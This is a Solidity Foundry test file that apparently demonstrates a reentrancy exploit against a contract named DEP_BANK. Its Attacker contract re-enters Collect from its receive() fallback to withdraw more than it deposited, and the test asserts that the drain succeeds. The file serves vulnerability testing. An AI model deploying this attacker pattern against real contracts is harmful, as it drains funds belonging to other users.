
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {stdStorage, StdStorage} from "../lib/forge-std/src/StdStorage.sol";
import {DEP_BANK} from "../src/DEP_BANK.sol";
import {LogFile} from "../src/LogFile.sol";

contract TestReentrancyDEP_BANK is Test {
    using stdStorage for StdStorage;
    
    DEP_BANK public depBank;
    LogFile public logFile;
    Attacker public _attacker;

    function setUp() public {
        logFile = new LogFile();
        depBank = new DEP_BANK();
        depBank.SetLogFile(address(logFile));
        depBank.SetMinSum(0);
        depBank.Initialized();
        
        _attacker = new Attacker(address(depBank));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal <= type(uint128).max);
        
        depBank.SetMinSum(0);
        depBank.Initialized();
        
        vm.deal(address(depBank), attackVal * 3);
        vm.deal(address(_attacker), attackVal * 3);
        vm.deal(address(this), attackVal * 3);
        
        _attacker.setupAttack{value: attackVal}(attackVal);
        _attacker.attack(attackVal);
        
        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }
    
    receive() external payable {}
}

contract Attacker {
    DEP_BANK public victim;
    
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public initialSnapshot;
    uint256 public attackAmount;
    uint256 public balanceBeforeAttack;
    
    constructor(address victimAddress) { 
        victim = DEP_BANK(victimAddress);
    }
    
    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        
        victim.Deposit{value: val}();
    }
    
    function attack(uint256 val) public {
        attackAmount = val;
        balanceBeforeAttack = address(this).balance;
        
        victim.Collect(val);
        
        uint256 balanceAfterAttack = address(this).balance;
        uint256 balanceIncrease = balanceAfterAttack - balanceBeforeAttack;
        
        if (balanceIncrease >= val * 2) {
            exploitSucceeded = true;
        }
    }
    
    receive() external payable {
        if (attackCallCount < 1) {
            attackCallCount++;
            victim.Collect(attackAmount);
        }
    }
}
